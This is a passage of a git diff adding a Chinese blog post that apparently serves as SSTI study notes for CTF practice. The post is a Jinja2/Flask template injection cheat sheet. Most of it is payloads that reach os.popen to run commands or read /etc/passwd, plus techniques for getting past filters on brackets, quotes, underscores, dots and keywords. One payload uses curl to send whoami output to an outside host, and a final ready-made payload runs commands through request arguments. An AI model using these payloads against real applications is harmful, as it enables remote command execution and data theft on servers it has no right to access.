class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>通用命令执行</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123; % <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() % &#125;</span><br><span class="line">&#123; % <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> % &#125;</span><br><span class="line">  &#123; % <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() % &#125;</span><br><span class="line">  &#123; % <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ % &#125;</span><br><span class="line">    &#123; % <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() % &#125;</span><br><span class="line">      &#123; &#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123; % endif % &#125;</span><br><span class="line">  &#123; % endfor % &#125;</span><br><span class="line">&#123; % endif % &#125;</span><br><span class="line">&#123; % endfor % &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ul>
+<li><p>过滤中括号[]</p>
+<p><strong>getitem()</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>pop()</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>字典读取</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[<span class="string">&#x27;eval&#x27;</span>]()</span><br><span class="line">__builtins__.<span class="built_in">eval</span>()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤引号</p>
+<ul>
+<li><p>request绕过</p>
+<p>GET方式，利用request.args传递参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125; &#125;&amp;arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>POST方式，利用request.values传递参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125; &#125;</span><br><span class="line">post:arg1=<span class="built_in">open</span>&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>Cookie方式，利用request.cookies传递参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125; &#125;</span><br><span class="line">Cookie:arg1=<span class="built_in">open</span>;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<p>  先获取chr函数，赋值给chr，后面拼接字符串</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; % <span class="built_in">set</span></span><br><span class="line"><span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span></span><br><span class="line">% &#125; &#123; &#123;</span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="built_in">chr</span>(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read()</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>过滤下划线_</p>
+<ul>
+<li><p>十六进制编码绕过</p>
+<p>_编码后为\x5f</p>
+</li>
+<li><p>request绕过</p>
+</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;</span><br><span class="line"><span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line">&#125; &#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤{ {</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; % <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> % &#125;<span class="number">1</span>&#123; % endif % &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤func_globals</p>
+<p><strong>__getattribute__方法</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">60</span>].__init__.__getattribute__(<span class="string">&#x27;func_global&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="number">12</span>]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">60</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="number">12</span>]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤<code>.</code></p>
+<p>在python中，可用以下表示法可用于访问对象的属性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125; &#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&quot;__class__&quot;</span>]&#125; &#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125; &#125;</span><br><span class="line">&#123; &#123;<span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>用attr()绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;().__class__&#125; &#125; </span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">&#123; &#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125; &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用[]绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;().__class__&#125; &#125;</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">&#123; &#123;()[<span class="string">&#x27;__class__&#x27;</span>]&#125; &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>过滤关键字</p>
+<ol>
+<li><p>替换为空</p>
+<ul>
+<li>双写绕过</li>
+</ul>
+</li>
+<li><p>直接ban掉</p>
+<ul>
+<li><p>拼接字符绕过</p>
+<p>这里以过滤class为例子</p>
+<p>用中括号括起来然后里面用引号连接，可以用+号或者不用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125; &#125;</span><br><span class="line">&#123; &#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用join拼接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125; &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>反转绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__ssalc__&quot;</span>][::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>base64编码绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果过滤掉__class__关键词</span><br><span class="line">__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>大小写绕过（前提是过滤的只是小写）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>.lower()]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在jinja2中利用~进行拼接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; %<span class="built_in">set</span> a=<span class="string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="built_in">set</span> b=<span class="string">&#x27;ss__&#x27;</span>% &#125;&#123; &#123;<span class="string">&quot;&quot;</span>[a~b]&#125; &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><p>过滤init</p>
+<p>可以同_<em>enter__或_<em>exit</em></em></p>
+</li>
+</ul>
+<h2 id="任务解决方法"><a href="#任务解决方法" class="headerlink" title="任务解决方法"></a>任务解决方法</h2><h4 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h4><p>?name={ {().__<em>class__.__<em>bases\</em></em>[0].<strong>subclasses__()[134].__init\</strong>.__globals__[‘popen’](‘dir’).read()} }</p>
+<h4 id="绕过关键词检测"><a href="#绕过关键词检测" class="headerlink" title="绕过关键词检测"></a>绕过关键词检测</h4><p>通过魔术方法_getattribute把class方法变成字符串操作就是()._class==()._<em>getattribute_\</em>(“__class__“) 接着就可以通过传参绕过</p>
+<h4 id="绕过引号过滤"><a href="#绕过引号过滤" class="headerlink" title="绕过引号过滤"></a>绕过引号过滤</h4><p>采取request绕过，通过get方法进行传参</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123; &#123;().__getattribute__(request.args.x1).__bases__[0].__subclasses__()[134].__init__.__globals__[request.args.x2](request.args.x3).read()&#125; &#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;popen&amp;x3&#x3D;dir</span><br></pre></td></tr></table></figure>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感谢请我喝奶茶<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">文件包含漏洞</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SSTI模板注入</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/01/14/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/01/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          正则表达式学习笔记
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件包含漏洞和伪协议学习总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
+
 
 
           </div>
@@ -225,9 +578,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
